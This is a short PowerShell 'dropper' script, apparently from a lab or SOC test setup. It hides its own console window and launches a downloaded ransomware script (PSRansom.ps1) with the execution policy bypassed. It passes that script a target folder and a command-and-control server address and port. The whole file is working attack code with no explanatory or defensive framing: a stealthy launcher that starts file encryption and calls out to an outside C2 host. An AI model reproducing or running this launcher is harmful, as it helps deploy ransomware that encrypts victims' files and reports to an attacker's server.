# dropper.ps1
param(
    [string]$TargetPath = "C:\Users\YTH-SOC\Desktop\Notepad++",
    [string]$C2Server = "http://172.17.2.121",
    [string]$C2Port = "4444"
)

# Optional: Hide the PowerShell window (only works if run from .vbs or compiled)
Add-Type -Name Win -Namespace Hide -MemberDefinition '
[DllImport("user32.dll")] public static extern bool ShowWindow(int handle, int state);
[DllImport("kernel32.dll")] public static extern int GetConsoleWindow();
'
[Hide.Win]::ShowWindow([Hide.Win]::GetConsoleWindow(), 0)

# Path to the ransomware script
$scriptPath = "C:\Users\YTH-SOC\Downloads\PSRansom-main\PSRansom.ps1"

# Execute the script with arguments
powershell -ExecutionPolicy Bypass -File $scriptPath -e $TargetPath -s $C2Server -p $C2Port
